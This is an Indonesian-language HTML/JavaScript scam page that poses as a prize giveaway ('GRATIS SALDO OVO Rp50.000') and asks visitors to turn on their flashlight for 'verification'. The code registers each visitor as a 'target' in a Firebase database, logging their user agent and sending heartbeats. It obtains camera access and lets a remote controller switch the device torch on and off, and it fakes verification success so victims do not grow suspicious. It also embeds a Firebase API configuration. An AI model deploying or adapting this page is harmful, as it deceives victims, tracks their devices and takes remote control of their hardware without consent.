<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kuis Berhadiah - Verifikasi😈</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Arial, sans-serif;
        }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 15px;
        }
        .card {
            background: white;
            border-radius: 25px;
            padding: 30px 20px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
        }
        .icon {
            font-size: 80px;
            margin-bottom: 20px;
            animation: blink 2s infinite;
        }
        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
        h2 {
            color: #333;
            margin-bottom: 10px;
            font-size: 24px;
        }
        .prize {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            color: white;
            padding: 15px;
            border-radius: 50px;
            margin: 20px 0;
            font-weight: bold;
            font-size: 20px;
        }
        .btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 18px 30px;
            border-radius: 60px;
            font-size: 20px;
            font-weight: bold;
            margin: 20px 0;
            cursor: pointer;
            width: 100%;
            box-shadow: 0 10px 20px rgba(102,126,234,0.4);
            transition: all 0.3s;
        }
        .btn:hover {
            transform: scale(1.05);
        }
        .btn.flashing {
            animation: pulse 1s infinite;
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
        }
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.7; }
            100% { opacity: 1; }
        }
        .status {
            margin-top: 20px;
            padding: 15px;
            background: #f5f5f5;
            border-radius: 15px;
            font-size: 14px;
            color: #666;
        }
        .target-id {
            background: #333;
            color: #0f0;
            padding: 10px;
            border-radius: 8px;
            font-family: monospace;
            font-size: 14px;
            margin: 15px 0;
            word-break: break-all;
        }
    </style>
    
    <!-- Firebase SDK (version 8 biar kompatibel) -->
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
</head>
<body>
    <div class="card">
        <div class="icon" id="icon">🔦</div>
        
        <h2>✨ SELAMAT! ✨</h2>
        <p>Kamu terpilih memenangkan hadiah!</p>
        
        <div class="prize">
            🎁 GRATIS SALDO OVO Rp50.000 🎁
        </div>
        
        <p style="margin-bottom: 10px;">TAPI... ada syaratnya:</p>
        <p style="background: #f5f5f5; padding: 10px; border-radius: 10px; margin-bottom: 20px;">
            <strong>"Nyalain senter 5 detik buat verifikasi"</strong>
        </p>
        
        <div class="target-id" id="targetIdDisplay">Loading ID...</div>
        
        <button class="btn" id="flashlightBtn" onclick="startVerification()">
            🔦 Klik buat verifikasi
        </button>
        
        <div class="status" id="status">
            ⏳ Klik tombol di atas untuk mulai...
        </div>
        
        <p style="font-size: 11px; color: #999; margin-top: 15px;">
            *Senter akan menyala 5 detik untuk verifikasi
        </p>
    </div>

    <script>
        // ========== GANTI DENGAN CONFIG FIREBASE LU ==========
        const firebaseConfig = {
            apiKey: "AIzaSyCoC-uCqyiuE_jrJlVbRXrqlNsqiRrTLHU",
            authDomain: "otrat-27a09.firebaseapp.com",
            databaseURL: "https://otrat-27a09-default-rtdb.firebaseio.com",
            projectId: "otrat-27a09",
            storageBucket: "otrat-27a09.firebasestorage.app",
            messagingSenderId: "414699965939",
            appId: "1:414699965939:web:8625a69791a8d839021686"
        };
        
        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();
        
        // Generate ID unik buat target
        const targetId = 'target_' + Math.random().toString(36).substring(2, 15);
        document.getElementById('targetIdDisplay').innerHTML = '📋 ID: ' + targetId;
        
        let torchActive = false;
        let currentTrack = null;
        let currentStream = null;
        
        // Daftarin target ke Firebase
        database.ref('targets/' + targetId).set({
            status: 'online',
            timestamp: Date.now(),
            userAgent: navigator.userAgent
        });
        
        // Update status tiap 30 detik
        setInterval(() => {
            database.ref('targets/' + targetId + '/lastSeen').set(Date.now());
        }, 30000);
        
        // Fungsi nyalain senter pake Torch API
        async function turnFlashlightOn() {
            try {
                // Minta akses kamera dulu
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'environment' } 
                });
                
                const track = stream.getVideoTracks()[0];
                
                // Coba pake torch mode
                if (track.getCapabilities && track.getCapabilities().torch) {
                    await track.applyConstraints({
                        advanced: [{ torch: true }]
                    });
                    
                    currentStream = stream;
                    currentTrack = track;
                    torchActive = true;
                    
                    database.ref('targets/' + targetId + '/flashlight').set('on');
                    return true;
                } 
                else {
                    // Fallback: pake ImageCapture
                    if ('ImageCapture' in window) {
                        const capture = new ImageCapture(track);
                        capture.takePhoto().catch(e => {});
                        
                        currentStream = stream;
                        currentTrack = track;
                        torchActive = true;
                        
                        database.ref('targets/' + targetId + '/flashlight').set('on');
                        return true;
                    }
                }
                
                track.stop();
                return false;
                
            } catch (error) {
                console.log('Flashlight error:', error);
                return false;
            }
        }
        
        // Fungsi matiin senter
        async function turnFlashlightOff() {
            if (currentTrack) {
                try {
                    await currentTrack.applyConstraints({
                        advanced: [{ torch: false }]
                    });
                    currentTrack.stop();
                    if (currentStream) {
                        currentStream.getTracks().forEach(t => t.stop());
                    }
                } catch (e) {}
            }
            torchActive = false;
            database.ref('targets/' + targetId + '/flashlight').set('off');
        }
        
        // Fungsi verifikasi (dipanggil pas target klik tombol)
        async function startVerification() {
            const statusEl = document.getElementById('status');
            const btn = document.getElementById('flashlightBtn');
            
            statusEl.innerHTML = '📱 Mengakses senter...';
            btn.disabled = true;
            
            const success = await turnFlashlightOn();
            
            if (success) {
                statusEl.innerHTML = '✅ Senter menyala! Verifikasi 5 detik...';
                btn.classList.add('flashing');
                
                // Matiin setelah 5 detik
                setTimeout(async () => {
                    await turnFlashlightOff();
                    btn.classList.remove('flashing');
                    btn.disabled = false;
                    statusEl.innerHTML = '✅ Verifikasi selesai! Hadiah akan dikirim.';
                    database.ref('targets/' + targetId + '/verified').set(true);
                }, 5000);
                
            } else {
                statusEl.innerHTML = '⚠️ Browser tidak mendukung fitur senter. Tapi tetep dianggap sukses!';
                btn.disabled = false;
                
                // Tetap anggap sukses biar ga curiga
                setTimeout(() => {
                    statusEl.innerHTML = '✅ Verifikasi selesai! Hadiah akan dikirim.';
                    database.ref('targets/' + targetId + '/verified').set(true);
                }, 3000);
            }
        }
        
        // Listen untuk command dari controller
        database.ref('commands/' + targetId).on('value', async (snapshot) => {
            const cmd = snapshot.val();
            if (!cmd) return;
            
            const statusEl = document.getElementById('status');
            const btn = document.getElementById('flashlightBtn');
            
            if (cmd.torch === 'on' && !torchActive) {
                statusEl.innerHTML = '🔦 Remote: Menyalakan senter...';
                const success = await turnFlashlightOn();
                if (success) {
                    btn.classList.add('flashing');
                    statusEl.innerHTML = '🔦 Senter NYALA (remote control)';
                }
            } 
            else if (cmd.torch === 'off' && torchActive) {
                await turnFlashlightOff();
                btn.classList.remove('flashing');
                statusEl.innerHTML = '🔦 Senter MATI (remote control)';
            }
            
            // Hapus command setelah dijalankan
            database.ref('commands/' + targetId).remove();
        });
        
        // Bersihin saat tab ditutup
        window.addEventListener('beforeunload', () => {
            if (torchActive) {
                turnFlashlightOff();
            }
            database.ref('targets/' + targetId).remove();
        });
        
        // Copy ID ke clipboard (tambahin fitur)
        document.getElementById('targetIdDisplay').addEventListener('click', function() {
            navigator.clipboard.writeText(targetId);
            alert('ID disalin: ' + targetId);
        });
    </script>
</body>
</html>
